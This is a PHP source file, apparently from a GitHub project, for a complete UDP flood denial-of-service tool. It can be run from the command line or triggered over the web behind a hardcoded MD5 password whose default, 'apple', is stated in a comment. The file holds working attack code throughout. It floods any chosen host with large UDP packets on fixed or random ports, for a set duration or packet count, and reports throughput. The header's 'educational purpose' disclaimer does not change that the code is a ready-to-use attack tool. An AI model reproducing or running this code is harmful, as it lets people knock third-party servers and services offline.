<?php 

/**
 * Script to perform a DDoS UDP Flood by PHP
 * 
 *
 * @package DDoS
 * @link https://github.com/drego85/DDoS-PHP-Script The DDoS UDP flood GitHub project
 * @author Andrea Draghetti (original founder) 
 * @author TheZer0
 * @author Smaury
 * @author moty66  
 * @author AxissXs
 * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2 
 * 
 * This tool is written on educational purpose, please use it on your own good faith.
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 * 
 * 
 */

// Current version
define('DDOS_VERSION',				'0.2' );

// MD5 Password to be used when the script is executed from the webserver, default is "apple"
define('DDOS_PASSWORD',				'1f3870be274f6c49b3e31a0c6728957f' );

// Script max execution time
define('DDOS_MAX_EXECUTION_TIME',0);

// Default and max packets size
define('DDOS_DEFAULT_PACKET_SIZE',	65000 );
define('DDOS_MAX_PACKET_SIZE',		65000 );

// Default byte to send
define('DDOS_DEFAULT_BYTE',"\x00");

// Loggin functions
define('DDOS_LOG_DEBUG',			4 );
define('DDOS_LOG_INFO',				3 );
define('DDOS_LOG_NOTICE',			2 );
define('DDOS_LOG_WARNING',			1 );
define('DDOS_LOG_ERROR',			0 );

// Output formats 
define('DDOS_OUTPUT_FORMAT_JSON',	'json' );
define('DDOS_OUTPUT_FORMAT_TEXT',	'text' );
define('DDOS_OUTPUT_FORMAT_XML',	'xml' );

// Output status
define('DDOS_OUTPUT_STATUS_ERROR',	'error' );
define('DDOS_OUTPUT_STATUS_SUCCESS','success' );




/**
 * DDoS main class
 * 
 * @author moty66
 * @since 0.2
 */
class DDoS {
	
	/**
	 * Default parameters
	 * @var array
	 */
	private $params = array(
			'host' => 	'',
			'port' => 	'',
			'packet' => '',
			'time'	=> 	'',
			'pass'	=> 	'',
			'bytes' =>	'',
			'verbose'=> DDOS_LOG_INFO,
			'format'=> 'text',
			'output'=> '',
			'interval'=>'1'
	);
	
	
	/**
	 * Log labels
	 * @var array
	 */
	private $log_labels = array(
			DDOS_LOG_DEBUG => 'debug',
			DDOS_LOG_INFO => 'info',
			DDOS_LOG_NOTICE => 'notice',
			DDOS_LOG_WARNING => 'warning',
			DDOS_LOG_ERROR => 'error'
	);
	
	
	/**
	 * Content type to sent in header
	 * @var string
	 */
	private $content_type = "";
	
	
	/**
	 * Output buffer, will be printed later in text,json or xml format
	 * @var array
	 */
	private $output = array();
	
	
	/**
	 * Initializer
	 */
	public function __construct($params = array()) {
		
		ob_start();
		
		ini_set('max_execution_time',DDOS_MAX_EXECUTION_TIME);
		
		$this->set_params($params);
		
		$this->set_content_type();
		
		$this->signature();

		if(isset($this->params['help'])) {
			$this->usage();
			exit;
		}
		
		$this->validate_params();

		
		$this->attack();
		
		$this->print_output();
		
		ob_end_flush();
	}
	
	
	/**
	 * Prints the script name and version number
	 */
	public function signature() {
		if(DDOS_OUTPUT_FORMAT_TEXT == $this->get_param('format')) {
			$this->println('DDoS UDP Flood script');
			$this->println('version '.DDOS_VERSION);
			$this->println();
		}
	}
	
	
	/**
	 * Prints the script usage
	 */
	public function usage() {
		$this->println("EXAMPLES:");
		$this->println("from terminal:  php ./".basename(__FILE__)." host=TARGET port=PORT time=SECONDS packet=NUMBER bytes=NUMBER");
		$this->println("from webserver: http://localhost/ddos.php?pass=PASSWORD&host=TARGET&port=PORT&time=SECONDS&packet=NUMBER&bytes=NUMBER");
		$this->println();
		$this->println("PARAMETERS:");
		$this->println("help	Print this help summary page");
		$this->println("host	REQUIRED specify IP or HOSTNAME");
		$this->println("pass	REQUIRED only if used from webserver");
		$this->println("port	OPTIONAL if not specified a random ports will be selected");
		$this->println("time	OPTIONAL seconds to keep the DDoS alive, required if packet is not used");
		$this->println("packet	OPTIONAL number of packets to send to the target, required if time is not used");
		$this->println("bytes	OPTIONAL size of the packet to send, defualt: ".DDOS_DEFAULT_PACKET_SIZE);
		$this->println("format	OPTIONAL output format, (text,json,xml), default: text");
		$this->println("output	OPTIONAL logfile, save the output to file");
		$this->println("verbose	OPTIONAL 0: debug, 1:info, 2:notice, 3:warning, 4:error, default: info");
		$this->println();
		$this->println("Note: 	If both time and packet are specified, only time will be used");
		$this->println();
		$this->println("More information on https://github.com/drego85/DDoS-PHP-Script");
		$this->println();
	}
	
	
	/**
	 * Start the UDP flood attack
	 * TODO Rewrite the attack code, need to remove the double loop and to find a system to
	 * 		print out a progress bar when we are in text mode
	 */
	private function attack(){
		
		$packets = 0;
		$message = str_repeat(DDOS_DEFAULT_BYTE, $this->get_param('bytes'));
		
		$this->log('DDos UDP flood started');
		
		// Time based attack
		if($this->get_param('time')) {
			
			$exec_time = $this->get_param('time');
			$max_time = time() + $exec_time;
		
			while(time() < $max_time){
				$packets++;
				$this->log('Sending packet #'.$packets,DDOS_LOG_DEBUG);
				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
				usleep($this->get_param('interval') * 100);
			}
			$timeStr = $exec_time. ' second';
			if(1 != $exec_time) {
				$timeStr .= 's';
			}
		}
		// Packet number based attack
		else {
			$max_packet = $this->get_param('packet');
			$start_time=time();
		
			while($packets < $max_packet){
				$packets++;
				$this->log('Sending packet #'.$packets,DDOS_LOG_DEBUG);
				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
				usleep($this->get_param('interval') * 100);
			}
			$exec_time = time() - $start_time;
		
			// If the script end before 1 sec, all the packets were sent in 1 sec
			if($exec_time <= 1){
				$exec_time=1;
				$timeStr = 'about a second';
			}
			else {
				$timeStr = 'about ' . $exec_time . ' seconds';
			}
		}
		
		$this->log("DDoS UDP flood completed");
		
		$data = $this->params;
		
		// We don't need to send pass, packets and time as data for json and xml, ad we are sending the total
		unset($data['pass']);
		unset($data['packet']);
		unset($data['time']);
		
		$data['port'] = 0 == $data['port'] ? 'Radom ports' : $data['port'];
		$data['total_packets'] = $packets;
		$data['total_size'] = $this->format_bytes($packets*$data['bytes']);
		$data['duration'] = $timeStr;
		$data['average'] = round($packets/$exec_time, 2);
		
		$this->set_output('UDP flood completed', DDOS_OUTPUT_STATUS_SUCCESS,$data);
		
		$this->print_output();
		
		exit;
	}
	
	

	/**
	 * UDP Connect
	 * @param string 	$h Host name or ip address
	 * @param integer 	$p Port number, if the port is 0 then a random port will be used
	 * @param string 	$out Data to send
	 * @return boolean	True if the packet was sent
	 */
	private function udp_connect($h,$p,$out){
		
		if(0 == $p) {
			$p = rand(1,rand(1,65535));
		}

		$this->log("Trying to open socket udp://$h:$p",DDOS_LOG_DEBUG);
		$fp = @fsockopen('udp://'.$h, $p, $errno, $errstr, 30);
	
		if(!$fp) {
			$this->log("UDP socket error: $errstr ($errno)",DDOS_LOG_DEBUG);
			$ret = false;
		}
		else {
			$this->log("Socket opened with $h on port $p",DDOS_LOG_DEBUG);
			if(!@fwrite($fp, $out)) {
				$this->log("Error during sending data",DDOS_LOG_ERROR);
			}
			else {
				$this->log("Data sent successfully",DDOS_LOG_DEBUG);
			}
			@fclose($fp);
			$ret = true;
			$this->log("Closing socket udp://$h:$p",DDOS_LOG_DEBUG);
		}
	
		return $ret;
	}
	
	
	
	/**
	 * Parse parameters from argv, post or get
	 * @todo Remove setting params from this method, let do it outside the class
	 */
	private function set_params($params = array()) {
		
		$original_params = array_keys($this->params);
		$original_params[] = 'help';
		
		foreach($params as $key => $value) {
			if(!in_array($key, $original_params)) {
				$this->set_output("Unknown param $key", DDOS_OUTPUT_STATUS_ERROR);
				$this->print_output();
				exit(1);
			}
			$this->set_param($key, $value);
		}
	}
	
	/**
	 * Validate and santize the parameters
	 */
	private function validate_params() {
		
		// Password for web users
		if(!$this->is_cli() && md5($this->get_param('pass')) !== DDOS_PASSWORD) {
			$this->set_output("Wrong password", DDOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		elseif(!$this->is_cli()) {
			$this->log('Password accepted');
		}
		
		if(!$this->is_valid_target($this->get_param('host'))) {
			$this->set_output("Invalid host", DDOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		else {
			$this->log("Setting host to " . $this->get_param('host'));
		}
		if("" != $this->get_param('port') && !$this->is_valid_port($this->get_param('port'))) {
			$this->log("Invalid port", DDOS_LOG_WARNING);
			$this->log("Setting port to random",DDOS_LOG_NOTICE);
			$this->set_param('port', 0);
		}
		else {
			$this->log("Setting port to ".$this->get_param('port'));
		}
		
		if(is_numeric($this->get_param('bytes')) && 0 < $this->get_param('bytes')) {
			if(DDOS_MAX_PACKET_SIZE < $this->get_param('bytes')) {
				$this->log("Packet size exceeds the max size", DDOS_LOG_WARNING);
			}
			$this->set_param('bytes',min($this->get_param('bytes'),DDOS_MAX_PACKET_SIZE));
			$this->log("Setting packet size to ". $this->format_bytes($this->get_param('bytes')));
		}
		else {
			$this->log("Setting packet size to ".$this->format_bytes(DDOS_DEFAULT_PACKET_SIZE),DDOS_LOG_NOTICE);
			$this->set_param('bytes',DDOS_DEFAULT_PACKET_SIZE);
		}
		
		if(!is_numeric($this->get_param('time')) && !is_numeric($this->get_param('packet'))) {
			$this->set_output("Missing parameter time or packet", DDOS_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		else {
			// Just to be sure that users does not submit a wrong time "example: a,-1" and correct packet
			$this->set_param('time', abs(intval($this->get_param('time'))));
			$this->set_param('packet', abs(intval($this->get_param('packet'))));
		}
		
		if('' != $this->get_param('output')) {
			$this->log("Setting log file to " .$this->get_param('output'),DDOS_LOG_INFO);
		}
		
	}
	
	
	/**
	 * Returns a param
	 * @param 	string 	$param name of the parameter
	 * @return 	string|null	Value of the parameter or null if not exsist
	 */
	public function get_param($param) {
		return isset($this->params[$param]) ? $this->params[$param] : null;
	}
	
	/**
	 * Add a parameter 
	 * @param string 	$param
	 * @param mixed 	$value
	 */
	private function set_param($param,$value) {
		
		$this->params[$param] = $value;
	}
	
	/**
	 * Set the content type for each output format
	 */
	private function set_content_type() {
		
		// Set the content type headers only for web
		if($this->is_cli()) {
			return;
		}
		
		switch($this->get_param('output')) {
			case DDOS_OUTPUT_FORMAT_JSON : {
				$this->content_type = "application/json; charset=utf-8;";
				break;
			}
			case DDOS_OUTPUT_FORMAT_XML : {
				$this->content_type = "application/xml; charset=utf-8;";
				break;
			}
			default : {
				$this->content_type = "text/plain; charset=utf-8;";
 				break;
			}
		}
		
		header("Content-Type: ". $this->content_type);
		$this->log('Setting Content-Type header to ' . $this->content_type, DDOS_LOG_DEBUG);
	}
	
	
	/**
	 * Check if we are running the script from terminal or from a web server
	 * @return boolean True if sapi name is cli
	 */
	public static function is_cli() {
		return php_sapi_name() == 'cli';
	}
	

	/**
	 * Get random port number
	 * @return number
	 */
	public function get_random_port() {
		return rand(1,65535);
	}
	
	
	/**
	 * Check if the port is valid
	 * @param 	integer 	$port
	 * @return 	integer 	Port number or 0 if invalid
	 */
	function is_valid_port($port = 0){
		return ($port >= 1 &&  $port <= 65535) ? $port : 0;
	}
	
	
	/**
	 * Check if the host name or the ip address are valid
	 * @see	https://en.wikipedia.org/wiki/Hostname
	 * @param string $target
	 * @return boolean
	 */
	function is_valid_target($target) {
		return 	(	//valid chars check
				preg_match("/^([a-z\d](-*[a-z\d])*)(\.([a-z\d](-*[a-z\d])*))*$/i", $target)
				//overall length check
				&& 	preg_match("/^.{1,253}$/", $target)
				// Validate each label
				&& 	preg_match("/^[^\.]{1,63}(\.[^\.]{1,63})*$/", $target)
		)
		||	filter_var($target, FILTER_VALIDATE_IP);
	}
	
	
	/**
	 * Convert from bytes to human readable size
	 * @param integer $bytes
	 * @param integer $precision Default:2
	 * @return string
	 */
	function format_bytes($bytes, $dec = 2) {
		// exaggerating :)
		$size   = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
		$factor = floor((strlen($bytes) - 1) / 3);
		return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
	}
	
	
	/**
	 * Prepare the output data. to be printed in the correct format later
	 * @param string 	$message
	 * @param integer 	$code
	 * @param mixed 	$data
	 */
	private function set_output($message, $code, $data = null) {
		
		$this->output= array("status" =>$code,"message" => $message);
		if(null != $data) {
			$this->output['data'] = $data;
		}
	} 
	
	/**
	 * Print the output of the script
	 */
	private function print_output() {
		switch($this->get_param('format')) {
			case DDOS_OUTPUT_FORMAT_JSON: {
				echo json_encode($this->output);	
				break;
			}
			
			case DDOS_OUTPUT_FORMAT_XML: {
				$xml = new SimpleXMLElement('<root/>');
				array_walk_recursive($this->output, function($value, $key)use($xml){
					$xml->addChild($key, $value);
				});
				print $xml->asXML();
				break;
			}
			
			default: {
				$this->println();
				array_walk_recursive($this->output, function($value, $key) {
					$this->println($key .': ' . $value);
				});
			}
		}
	}
	
	/**
	 * Logging system, very useful for debugging
	 *
	 * @param string 	$message 	Message
	 * @param integer 	$code		Log code
	 */
	private function log($message,$code = DDOS_LOG_INFO) {
		if($code <= $this->get_param('verbose') && $this->get_param('format') == DDOS_OUTPUT_FORMAT_TEXT) {
			$this->println('['.$this->log_labels[$code] . '] ' . $message);	
		}
	}
	
	/**
	 * Save output to file
	 * @param unknown $message
	 */
	private function log_to_file($message) {
		if('' != $this->get_param('output')) {
			file_put_contents($this->get_param('output'), $message, FILE_APPEND | LOCK_EX);
		}	
	}
	
	
	/**
	 * Prints a message with a carriage return
	 * @param string 	$message Message to print
	 * @param integer 	$indent Number of tabs to print before the message
	 */
	private function println($message = '') {
		echo $message . "\n";
		$this->log_to_file($message . "\n");
		ob_flush();
		flush();
	}
}



$params = array();
if(DDoS::is_cli()) {
	global $argv;
	parse_str(implode('&', array_slice($argv, 1)), $params);
}
elseif(!empty($_POST)) {
	foreach($_POST as $index => $value) {
		$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
	}
}
elseif(!empty($_GET['host'])) {
	foreach($_GET as $index => $value) {
		$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
	}
}


$ddos = new DDoS($params);
